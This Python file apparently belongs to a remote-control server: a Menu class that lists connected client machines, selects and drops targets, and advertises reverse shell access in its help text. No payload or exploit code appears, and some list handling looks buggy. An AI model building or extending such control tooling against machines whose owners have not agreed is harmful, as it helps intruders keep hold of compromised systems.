import time

import server_folder.config as config
from socket import error as socket_error


class Menu:
    def __init__(self, server):
        self.server = server
        self.targets = []  # Will be filled by the tick-boxes in the GUI

    def help(self):
        print('Available commands are:\n'
              '[*] list   -   Show the list of connected clients.\n'
              '[*] select -   Select a client from the list to operate commands on.\n'
              '[*] quit   -   Deselect a client.\n'
              '[*] kill   -   Release a connection of a client.\n'
              '[*] shell  -   Get reverse shell access to the client.\n')

    def refresh_client_list(self):
        # Deletes invalid connections
        print('--------Clients--------\n')
        for i, item in enumerate(config.all_connections):
            try:
                item['data']['socket'].send(str.encode(' '))
                item['data']['socket'].recv(config.BUFFER_SIZE)
            except socket_error:
                config.all_connections.pop(i)
                continue
            print('{} |   {}'.format(i, config.all_connections[i]['ip']))
        print('\n')

    def kill(self):
        """ Disconnects a client """
        for target in self.targets:
            try:
                config.all_connections[target]['data']['socket'].close()
                print('[*] Successfully closed connection (not killed) ', config.all_connections[target]['ip'], '\n')
                config.all_connections.pop(target)
                self.quit(target)
            except socket_error:
                print('[!] Failed to kill client\n')

    def select(self, target):
        try:
            if target not in self.targets:
                self.targets.append(target)
                print('[*] You are now connected to ', config.all_connections[target]['ip'])
            else:
                print('Already targeting')
        except socket_error:
            print('[!] Invalid selection')
            self.quit()

    def quit(self, target=-1):
        """ Dis-selects the selected target"""
        if target == -1:
            self.targets = []
        else:
            self.targets.pop(target)

